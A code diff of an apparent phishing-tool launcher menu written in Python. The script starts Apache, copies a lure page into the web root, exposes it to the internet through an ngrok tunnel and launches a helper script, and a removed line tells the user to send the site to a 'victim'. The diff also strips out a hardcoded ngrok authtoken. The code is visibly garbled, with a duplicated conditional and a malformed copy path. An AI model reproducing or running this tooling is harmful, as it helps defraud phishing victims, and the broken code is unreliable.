@@ -25,11 +25,12 @@ while True:
  opcionMenu = input("select a opcion >>")
 
  if opcionMenu=="1":
+     if opcionMenu=="1":
      print ("starting ngrok")
-     os.system("./ngrok authtoken 1otl8ouPfwH3JwCDCD4fxu2YCgq_624ab5GeqzJhPPwHUbauT")
-     os.system("./ngrok ssh -R 8080:localhost:8088 remoteUser@IPAddress")
-     print("if you see this message ./ngrok: not found,please install ngrok")
-     print("Send that website to you victim and only wait ;)")
+     os.system("sudo service apache2 start")
+     os.system("chmod 777 ngrok")
+     os.system("cp -a site/index.html. /www/html/")
+     os.system("xterm -hold -e ./ngrok http 80 & xterm -hold -e python Cat.py")
      input("\npress enter to back")
      os.system("clear")
      
@@ -38,8 +39,9 @@ while True:
      os.system("clear")
 
  if opcionMenu=="2":
-     os.system("curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc && sudo apt install ngrok")
-     print ("")
+     os.system("sudo apt-get install unzip -y")
+     os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip")
+     os.system("unzip ngrok-stable-linux-amd64.zip")
      input("\npress enter to back")
      os.system("clear")
  
